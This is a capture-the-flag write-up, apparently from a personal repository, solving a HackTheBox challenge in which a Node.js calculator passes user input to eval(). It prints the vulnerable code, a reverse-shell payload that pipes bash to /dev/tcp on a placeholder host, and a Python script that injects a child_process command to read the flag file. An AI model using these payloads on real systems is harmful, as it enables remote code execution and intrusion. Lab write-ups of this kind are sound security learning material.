## This is my solution to the Insomnia Challenge on HackTheBox

### Issue in the Original Code

The original developer use eval() function on user input which is very dangerous

#### Mistake 

In helpers/calculatorHelper.js:
```
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${ formula } ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}
```

The program is using eval function on user_input. We'll tried to exploit it by using that input.
You can find node js rce payload [Link Here](https://medium.com/@sebnemK/node-js-rce-and-a-simple-reverse-shell-ctf-1b2de51c1a44)
I used this one but a little modified for to be compitable with the challenge
```
/?q=require('child_process').exec('bash+-c+"bash+-i+>%26+/dev/tcp/nc_host/nc_port+0>%261"')
```

### Here is my exploit

```python
import requests
from bs4 import BeautifulSoup as bs

url = "http://94.237.62.195:45843"
data = {"formula":"require(\"child_process\").exec(\"cat /flag.txt > /app/static/css/ok.txt\")"}

respond  = requests.post(f"{url}/api/calculate",json=data,headers={"Content-type":"Application/json"})
flag = requests.get(f"{url}/static/css/ok.txt")
print(flag.text.strip())
```

This Python script demonstrates how to exploit the vulnerability and then retrieving the flag.
